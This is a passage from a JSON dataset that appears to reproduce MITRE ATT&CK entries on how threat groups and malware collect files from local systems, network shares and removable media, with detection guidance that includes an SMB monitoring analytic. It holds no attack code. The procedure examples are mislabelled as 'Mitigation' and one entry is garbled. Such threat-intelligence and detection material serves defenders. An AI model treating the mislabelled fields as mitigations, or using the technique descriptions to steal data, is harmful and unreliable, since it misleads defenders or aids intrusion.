        "description": "APT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before exfiltration.[8][9][10][11]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has stolen data from compromised hosts.[12]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "APT3 will identify Microsoft Office documents on the victim's computer.[13]"
      },
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37 has collected data from victims' local systems.[14]"
      },
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 has collected data from a compromised host.[15]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used various tools to steal files from the compromised host.[16][17]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 has uploaded files and data from a compromised host.[18]"
      },
      {
        "id": "S1029",
        "name": "AuTo Stealer",
        "description": "AuTo Stealer can collect data such as PowerPoint files, Word documents, Excel files, PDF files, text files, database files, and image files from an infected machine.[2]"
      },
      {
        "id": "G0001",
        "name": "Axiom",
        "description": "Axiom has collected data from a compromised network.[19]"
      },
      {
        "id": "S0642",
        "name": "BADFLICK",
        "description": "BADFLICK has uploaded files from victims' machines.[20]"
      },
      {
        "id": "S0128",
        "name": "BADNEWS",
        "description": "When it first starts, BADNEWS crawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.[21][22]"
      },
      {
        "id": "S0337",
        "name": "BadPatch",
        "description": "BadPatch collects files from the local system that have the following extensions, then prepares them for exfiltration: .xls, .xlsx, .pdf, .mdb, .rar, .zip, .doc, .docx.[23]"
      },
      {
        "id": "S0234",
        "name": "Bandook",
        "description": "Bandook can collect local files from the system .[24]"
      },
      {
        "id": "S0239",
        "name": "Bankshot",
        "description": "Bankshot collects files from the local system.[25]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can retrieve information from the infected machine.[26]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal has collected information from a compromised host.[27]"
      },
      {
        "id": "S0564",
        "name": "BlackMould",
        "description": "BlackMould can copy files on a compromised host.[28]"
      },
      {
        "id": "S0520",
        "name": "BLINDINGCAN",
        "description": "BLINDINGCAN has uploaded files from victim machines.[29]"
      },
      {
        "id": "S0651",
        "name": "BoxCaon",
        "description": "BoxCaon can upload files from a compromised host.[30]"
      },
      {
        "id": "G0060",
        "name": "BRONZE BUTLER",
        "description": "BRONZE BUTLER has exfiltrated files stolen from local systems.[31]"
      },
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 has the ability to upload files from a compromised system.[32]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can capture and compress stolen credentials from the Registry and volume shadow copies.[33]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors obtained files and data from the compromised network.[34]"
      },
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks.[35]"
      },
      {
        "id": "C0026",
        "name": "C0026",
        "description": "During C0026, the threat actors collected documents from compromised hosts.[36]"
      },
      {
        "id": "S0274",
        "name": "Calisto",
        "description": "Calisto can collect data from user directories.[37]"
      },
      {
        "id": "S0572",
        "name": "Caterpillar WebShell",
        "description": "Caterpillar WebShell has a module to collect information from the local database.[38]"
      },
      {
        "id": "S1043",
        "name": "ccf32",
        "description": "ccf32 can collect files from a compromised host.[39]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower can collect data and files from a compromised host.[40]"
      },
      {
        "id": "S0020",
        "name": "China Chopper",
        "description": "China Chopper's server component can upload local files.[41][42][43][44]"
      },
      {
        "id": "S0667",
        "name": "Chrommme",
        "description": "Chrommme can collect data from a local system.[45]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling can collect information from a compromised host.[46]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can collect data from a local system.[47][48]"
      },
      {
        "id": "S0492",
        "name": "CookieMiner",
        "description": "CookieMiner has retrieved iPhone text messages from iTunes phone backup files.[49]"
      },
      {
        "id": "S0050",
        "name": "CosmicDuke",
        "description": "CosmicDuke steals user files from local hard drives with file extensions that match a predefined list.[50]"
      },
      {
        "id": "C0004",
        "name": "CostaRicto",
        "description": "During CostaRicto, the threat actors collected data and files from compromised networks.[51]"
      },
      {
        "id": "S1023",
        "name": "CreepyDrive",
        "description": "CreepyDrive can upload files to C2 from victim machines.[52]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson can collect information from a compromised host.[53]"
      },
      {
        "id": "S0538",
        "name": "Crutch",
        "description": "Crutch can exfiltrate files from compromised systems.[54]"
      },
      {
        "id": "S0498",
        "name": "Cryptoistic",
        "description": "Cryptoistic can retrieve files from the local file system.[55]"
      },
      {
        "id": "G1012",
        "name": "CURIUM",
        "description": "CURIUM has exfiltrated data from a compromised machine.[56]"
      },
      {
        "id": "S0687",
        "name": "Cyclops Blink",
        "description": "Cyclops Blink can upload files from a compromised host.[57]"
      },
      {
        "id": "S1014",
        "name": "DanBot",
        "description": "DanBot can upload files from compromised hosts.[58]"
      },
      {
        "id": "G0070",
        "name": "Dark Caracal",
        "description": "Dark Caracal collected complete contents of the 'Pictures' folder from compromised Windows systems.[59]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman can collect files from a compromised host.[60]"
      },
      {
        "id": "S1021",
        "name": "DnsSystem",
        "description": "DnsSystem can upload files from infected machines after receiving a command with uploaddd in the string.[61]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has collected data from local victim systems.[62]"
      },
      {
        "id": "S0694",
        "name": "DRATzarus",
        "description": "DRATzarus can collect information from a compromised host.[63]"
      },
      {
        "id": "S0502",
        "name": "Drovorub",
        "description": "Drovorub can transfer files from the victim machine.[64]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack can collect a variety of information from victim machines.[65]"
      },
      {
        "id": "S0634",
        "name": "EnvyScout",
        "description": "EnvyScout can collect sensitive NTLM material from a compromised host.[66]"
      },
      {
        "id": "S0404",
        "name": "esentutl",
        "description": "esentutl can be used to collect data from local file systems.[67]"
      },
      {
        "id": "S0512",
        "name": "FatDuke",
        "description": "FatDuke can copy files and directories from a compromised host.[68]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has gathered stolen credentials, sensitive data such as point-of-sale (POS), and ATM data from a compromised network before exfiltration.[69][70]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "FIN6 has collected and exfiltrated payment card data from compromised systems.[71][72][73]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 has collected files and other sensitive information from a compromised network.[74]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro can collect data from a compromised host, including Windows authentication information.[75]"
      },
      {
        "id": "S0036",
        "name": "FLASHFLOOD",
        "description": "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system. FLASHFLOOD will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories. FLASHFLOOD also collects information stored in the Windows Address Book.[76]"
      },
      {
        "id": "S0381",
        "name": "FlawedAmmyy",
        "description": "FlawedAmmyy has collected information and files from a compromised machine.[77]"
      },
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb can retrieve configuration data from a compromised AD FS server.[78]"
      },
      {
        "id": "S0193",
        "name": "Forfiles",
        "description": "Forfiles can be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before).[8]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has searched local system resources to access sensitive documents.[79]"
      },
      {
        "id": "S0503",
        "name": "FrameworkPOS",
        "description": "FrameworkPOS can collect elements related to credit card data from process memory.[80]"
      },
      {
        "id": "C0001",
        "name": "Frankenstein",
        "description": "During Frankenstein, the threat actors used Empire to gather various local system information.[81]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can upload files from victims' machines.[39][82]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM collected data from the victim's local system, including password hashes from the SAM hive in the Registry.[83]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has collected files from infected systems and uploaded them to a C2 server.[84]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can collect data from a compromised host.[45]"
      },
      {
        "id": "S0477",
        "name": "Goopy",
        "description": "Goopy has the ability to exfiltrate documents from infected systems.[85]"
      },
      {
        "id": "S0237",
        "name": "GravityRAT",
        "description": "GravityRAT steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.[86]"
      },
      {
        "id": "S0690",
        "name": "Green Lambert",
        "description": "Green Lambert can collect data from a compromised host.[87]"
      },
      {
        "id": "S0632",
        "name": "GrimAgent",
        "description": "GrimAgent can collect data and files from a compromised host.[88]"
      },
      {
        "id": "G0125",
        "name": "HAFNIUM",
        "description": "HAFNIUM has collected data and files from a compromised machine.[44]"
      },
      {
        "id": "S0009",
        "name": "Hikit",
        "description": "Hikit can upload files from compromised machines.[19]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq creates a backdoor through which remote attackers can read data from files.[89][90]"
      },
      {
        "id": "S1022",
        "name": "IceApple",
        "description": "IceApple can collect files, passwords, and other data from a compromised host.[91]"
      },
      {
        "id": "G0100",
        "name": "Inception",
        "description": "Inception used a file hunting plugin to collect .txt, .pdf, .xls or .doc files from the infected host.[92]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can collect data from the system, and can monitor changes in specified directories.[93]"
      },
      {
        "id": "S0015",
        "name": "Ixeshe",
        "description": "Ixeshe can collect data from a local system.[94]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar uploads files from a specified directory to the C2 server.[95]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang gathered information and files from local directories for exfiltration.[96][97]"
      },
      {
        "id": "S1020",
        "name": "Kevin",
        "description": "Kevin can upload logs and other data from a compromised host.[98]"
      },
      {
        "id": "S0526",
        "name": "KGH_SPY",
        "description": "KGH_SPY can send a file containing victim system information to C2.[99]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has collected Office, PDF, and HWP documents from its victims.[100][101]"
      },
      {
        "id": "S0250",
        "name": "Koadic",
        "description": "Koadic can download files off the target system to send back to the server.[102][103]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI has stored collected information and discovered processes in a tmp file.[104]"
      },
      {
        "id": "S1075",
        "name": "KOPILUWAK",
        "description": "KOPILUWAK can gather information from compromised hosts.[36]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ uploaded sensitive files, information, and credentials from a targeted organization for extortion or public release.[105]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has collected data and files from compromised networks.[106][107][108][109]"
      },
      {
        "id": "S0395",
        "name": "LightNeuron",
        "description": "LightNeuron can collect files from a local system.[110]"
      },
      {
        "id": "S0211",
        "name": "Linfo",
        "description": "Linfo creates a backdoor through which remote attackers can obtain data from local systems.[111]"
      },
      {
        "id": "G1014",
        "name": "LuminousMoth",
        "description": "LuminousMoth has collected files and data from compromised machines.[112][113]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete searches the File system for files of interest.[114]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa can collect then exfiltrate files from the compromised system.[115]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can collect files and information from a compromised host.[116]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has used a web shell to exfiltrate a ZIP file containing a dump of LSASS memory on a compromised machine.[117][118]"
      },
      {
        "id": "S0652",
        "name": "MarkiRAT",
        "description": "MarkiRAT can upload data from the victim's machine to the C2 server.[119]"
      },
      {
        "id": "S0500",
        "name": "MCMD",
        "description": "MCMD has the ability to upload files from an infected device.[120]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has collected various files from the compromised computers.[121][122]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can collect files and system information from a compromised host.[116][123]"
      },
      {
        "id": "S1015",
        "name": "Milan",
        "description": "Milan can upload files from a compromised host.[124]"
      },
      {
        "id": "S0084",
        "name": "Mis-Type",
        "description": "Mis-Type has collected files and data from a compromised host.[125]"
      },
      {
        "id": "S0083",
        "name": "Misdat",
        "description": "Misdat has collected files and data from a compromised host.[125]"
      },
      {
        "id": "S0079",
        "name": "MobileOrder",
        "description": "MobileOrder exfiltrates data collected from the victim mobile device.[126]"
      },
      {
        "id": "S1026",
        "name": "Mongall",
        "description": "Mongall has the ability to upload files from victim's machines.[127]"
      },
      {
        "id": "S0630",
        "name": "Nebulae",
        "description": "Nebulae has the capability to upload collected files to C2.[128]"
      },
      {
        "id": "S0691",
        "name": "Neoichor",
        "description": "Neoichor can upload files from a victim's machine.[97]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, the threat actors collected files and other data from compromised systems.[129]"
      },
      {
        "id": "S1090",
        "name": "NightClub",
        "description": "NightClub can use a file monitor to steal specific files from targeted systems.[130]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT can collect data from a local system.[131]"
      },
      {
        "id": "S0340",
        "name": "Octopus",
        "description": "Octopus can exfiltrate files from the system using a documents collector tool.[132]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
        "description": "During Operation CuckooBees, the threat actors collected data, files, and other information from compromised networks.[133]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "During Operation Dream Job, Lazarus Group used malicious Trojans and DLL files to exfiltrate data from an infected host.[63][134]"
      },
      {
        "id": "C0006",
        "name": "Operation Honeybee",
        "description": "During Operation Honeybee, the threat actors collected data from compromised hosts.[135]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors exfiltrated files and directories of interest from the targeted system.[136]"
      },
      {
        "id": "S0352",
        "name": "OSX_OCEANLOTUS.D",
        "description": "OSX_OCEANLOTUS.D has the ability to upload files from a compromised host.[137]"
      },
      {
        "id": "S0594",
        "name": "Out1",
        "description": "Out1 can copy files and Registry data from compromised hosts.[138]"
      },
      {
        "id": "S1017",
        "name": "OutSteel",
        "description": "OutSteel can collect information from a compromised host.[139]"
      },
      {
        "id": "S0598",
        "name": "P.A.S. Webshell",
        "description": "P.A.S. Webshell has the ability to copy files on a compromised host.[140]"
      },
      {
        "id": "S0208",
        "name": "Pasam",
        "description": "Pasam creates a backdoor through which remote attackers can retrieve files.[141]"
      },
      {
        "id": "G0040",
        "name": "Patchwork",
        "description": "Patchwork collected and exfiltrated files from the infected system.[142]"
      },
      {
        "id": "S1050",
        "name": "PcShare",
        "description": "PcShare can collect files and information from a compromised host.[39]"
      },
      {
        "id": "S0517",
        "name": "Pillowmint",
        "description": "Pillowmint has collected credit card data using native API functions.[143]"
      },
      {
        "id": "S0048",
        "name": "PinchDuke",
        "description": "PinchDuke collects user files from the compromised host based on predefined file extensions.[144]"
      },
      {
        "id": "S1031",
        "name": "PingPull",
        "description": "PingPull can collect data from a compromised host.[145]"
      },
      {
        "id": "S0012",
        "name": "PoisonIvy",
        "description": "PoisonIvy creates a backdoor through which remote attackers can steal system information.[146]"
      },
      {
        "id": "S1012",
        "name": "PowerLess",
        "description": "PowerLess has the ability to exfiltrate data, including Chrome and Edge browser database files, from compromised machines.[147]"
      },
      {
        "id": "S0194",
        "name": "PowerSploit",
        "description": "PowerSploit contains a collection of Exfiltration modules that can access data from local files, volumes, and processes.[148][149]"
      },
      {
        "id": "S0223",
        "name": "POWERSTATS",
        "description": "POWERSTATS can upload files from compromised hosts.[150]"
      },
      {
        "id": "S0238",
        "name": "Proxysvc",
        "description": "Proxysvc searches the local system and gathers data.[151]"
      },
      {
        "id": "S0197",
        "name": "PUNCHTRACK",
        "description": "PUNCHTRACK scrapes memory for properly formatted payment card data.[152][153]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can use a variety of commands, including esentutl.exe to steal sensitive data from Internet Explorer and Microsoft Edge, to acquire information that is subsequently exfiltrated.[154][155]"
      },
      {
        "id": "S0262",
        "name": "QuasarRAT",
        "description": "QuasarRAT can retrieve files from compromised client machines.[156]"
      },
      {
        "id": "S0686",
        "name": "QuietSieve",
        "description": "QuietSieve can collect files from a compromised host.[157]"
      },
      {
        "id": "S0629",
        "name": "RainyDay",
        "description": "RainyDay can use a file exfiltration tool to collect recently changed files on a compromised host.[128]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can collect Microsoft Word documents from the target's file system, as well as .txt, .doc, and .xls files from the Internet Explorer cache.[158][159]"
      },
      {
        "id": "S0169",
        "name": "RawPOS",
        "description": "RawPOS dumps memory from specific processes on a victim system, parses the dumped files, and scrapes them for credit card data.[160][161][162]"
      },
      {
        "id": "S0662",
        "name": "RCSession",
        "description": "RCSession can collect data from a compromised host.[163][46]"
      },
      {
        "id": "S0448",
        "name": "Rising Sun",
        "description": "Rising Sun has collected data and files from a compromised host.[164]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can collect host data and specific file types.[165][166][167]"
      },
      {
        "id": "S0090",
        "name": "Rover",
        "description": "Rover searches for files on local drives based on a predefined list of file extensions.[168]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot can collect files and information from a compromised host.[169]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has exfiltrated internal documents, files, and other data from compromised hosts.[170]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic has the ability to collect data from a compromised machine to deliver to the attacker.[171]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot has the ability to access the file system on a compromised host.[172]"
      },
      {
        "id": "S1019",
        "name": "Shark",
        "description": "Shark can upload files to its C2.[124][173]"
      },
      {
        "id": "S1089",
        "name": "SharpDisco",
        "description": "SharpDisco has dropped a recent-files stealer plugin to C:\\Users\\Public\\WinSrcNT\\It11.exe.[130]"
      },
      {
        "id": "S0444",
        "name": "ShimRat",
        "description": "ShimRat has the capability to upload collected files to a C2.[174]"
      },
      {
        "id": "S0610",
        "name": "SideTwist",
        "description": "SideTwist has the ability to upload files from a compromised host.[175]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA has uploaded files and information from victim machines.[176]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 extracted files from compromised networks.[177]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT has collected data and files from a compromised host.[51][178]"
      },
      {
        "id": "S0646",
        "name": "SpicyOmelette",
        "description": "SpicyOmelette has collected data and other information from a compromised host.[179]"
      },
      {
        "id": "S1037",
        "name": "STARWHALE",
        "description": "STARWHALE can collect data from an infected local host.[180]"
      },
      {
        "id": "G0038",
        "name": "Stealth Falcon",
        "description": "Stealth Falcon malware gathers data from the local victim system.[181]"
      },
      {
        "id": "S1034",
        "name": "StrifeWater",
        "description": "StrifeWater can collect data from a compromised host.[182]"
      },
      {
        "id": "S0559",
        "name": "SUNBURST",
        "description": "SUNBURST collected information from a compromised host.[183][184]"
      },
      {
        "id": "S1064",
        "name": "SVCReady",
        "description": "SVCReady can collect data from an infected host.[185]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate can collect information and files from a compromised host.[186]"
      },
      {
        "id": "S0011",
        "name": "Taidoor",
        "description": "Taidoor can upload data and files from a victim's machine.[187]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to steal documents from the local system including the print spooler queue.[188]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories.[189]"
      },
      {
        "id": "S0665",
        "name": "ThreatNeedle",
        "description": "ThreatNeedle can collect data and files from a compromised host.[109]"
      },
      {
        "id": "S0668",
        "name": "TinyTurla",
        "description": "TinyTurla can upload files from a compromised host.[190]"
      },
      {
        "id": "S0671",
        "name": "Tomiris",
        "description": "Tomiris has the ability to collect recent files matching a hardcoded list of extensions prior to exfiltration.[191]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot collects local files and information from the victim’s local machine.[192]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla RPC backdoors can upload files from victim machines.[193]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos can use its Get command to exfiltrate specified files from the compromised system.[194]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has collected files from victim machines, including certificates and cookies.[195]"
      },
      {
        "id": "S0452",
        "name": "USBferry",
        "description": "USBferry can collect information from an air-gapped host machine.[196]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has stolen the Active Directory database from targeted environments and used Wevtutil to extract event log information.[197][198]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT can collect data from a compromised host.[199]"
      },
      {
        "id": "S0515",
        "name": "WellMail",
        "description": "WellMail can exfiltrate files from the victim machine.[200]"
      },
      {
        "id": "S0514",
        "name": "WellMess",
        "description": "WellMess can send files from the victim machine to C2.[201][202]"
      },
      {
        "id": "S0645",
        "name": "Wevtutil",
        "description": "Wevtutil can be used to export events from a specific log.[203][204]"
      },
      {
        "id": "G0124",
        "name": "Windigo",
        "description": "Windigo has used a script to gather credentials in files left on disk by OpenSSH backdoors.[205]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has collected data from a compromised host prior to exfiltration.[206]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can collect information from a compromised host.[207]"
      },
      {
        "id": "S0653",
        "name": "xCaon",
        "description": "xCaon has uploaded files from victims' machines.[30]"
      },
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET collects contacts and application data from files in Desktop, Documents, Downloads, Dropbox, and WeChat folders.[208]"
      },
      {
        "id": "S0248",
        "name": "yty",
        "description": "yty collects files with the following extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .xlsm, .csv, .odt, .pps, .vcf and sends them back to the C2 server.[209]"
      },
      {
        "id": "S0672",
        "name": "Zox",
        "description": "Zox has the ability to upload files from a targeted system.[19]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell can transfer files from a compromised host.[210]"
      },
      {
        "id": "S1013",
        "name": "ZxxZ",
        "description": "ZxxZ can collect data from a compromised host.[211]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may search and collect local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for unexpected/abnormal access to files that may be malicious collection of local data, such as user files (pdf, .docx, .jpg, etc.) or local databases."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration."
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.  Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell."
      }
    ],
    "Subtechniques": "\nCollection"
  },
  {
    "Title": "Data from Network Shared Drive",
    "Code": "T1039",
    "Description": "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.",
    "Mitigation": [
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has collected files from network shared drives.[1]"
      },
      {
        "id": "S0128",
        "name": "BADNEWS",
        "description": "When it first starts, BADNEWS crawls the victim's mapped drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.[2]"
      },
      {
        "id": "G0060",
        "name": "BRONZE BUTLER",
        "description": "BRONZE BUTLER has exfiltrated files stolen from file shares.[3]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors collected files from network shared drives prior to network encryption.[4]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has collected data of interest from network shares.[5]"
      },
      {
        "id": "S0050",
        "name": "CosmicDuke",
        "description": "CosmicDuke steals user files from network shared drives with file extensions and keywords that match a predefined list.[6]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor can collect any files found in the enumerated drivers before sending it to its C2 channel.[7]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has searched network shares to access sensitive documents.[8]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group malware has collected Microsoft Office documents from mapped network drives.[9]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has collected data from remote systems by mounting network shares with net use and using Robocopy to transfer data.[10]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can collect data from network drives and stage it for exfiltration.[11]"
      },
      {
        "id": "G0054",
        "name": "Sowbug",
        "description": "Sowbug extracted Word documents from a file server on a victim network.[12]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for unexpected files (i.e. .pdf, .docx, .jpg, etc.)  interacting with network shares."
      },
      {
        "id": "DS0033",
        "dsource": "Network Share",
        "dcomp": "Network Share Access",
        "detects": "Monitor for unexpected and abnormal accesses to network shares."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that may search network shares on computers they have compromised to find files of interest. Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on network protocols such as SMB that revolve around network shares."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on network protocols such as SMB that revolve around network shares. Although there may be more native ways to detect detailed SMB events on the host, they can be extracted out of network traffic. With the right protocol decoders, port 445 traffic can be filtered and even the file path (relative to the share) can be retrieved.Looking at this activity more closely to obtain an adequate sense of situational awareness may make it possible to detect adversaries moving between hosts in a way that deviates from normal activity. Because SMB traffic is heavy in many environments, this analytic may be difficult to turn into something that can be used to quickly detect an APT. In some cases, it may make more sense to run this analytic in a forensic fashion. Looking through and filtering its output after an intrusion has been discovered may be helpful in identifying the scope of compromise.Analytic 1 - SMB Events Monitoringsmb_events = filter flow where (dest_port == \"445\" and protocol == \"smb\")smb_events.file_name = smb_events.proto_info.file_name"
      }
    ],
    "Subtechniques": "\nCollection"
  },
  {
    "Title": "Data from Removable Media",
    "Code": "T1025",
    "Description": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information. Some adversaries may also use Automated Collection on removable media.",
    "Mitigation": [
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed can find and collect data from removable media devices.[1][2]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "An APT28 backdoor may collect the entire contents of an inserted USB device.[3]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has the ability to collect data from USB devices.[4]"
      },
      {
        "id": "S0128",
        "name": "BADNEWS",
        "description": "BADNEWS copies files with certain extensions from USB devices toa predefined directory.[5]"
      },
      {
        "id": "S0050",
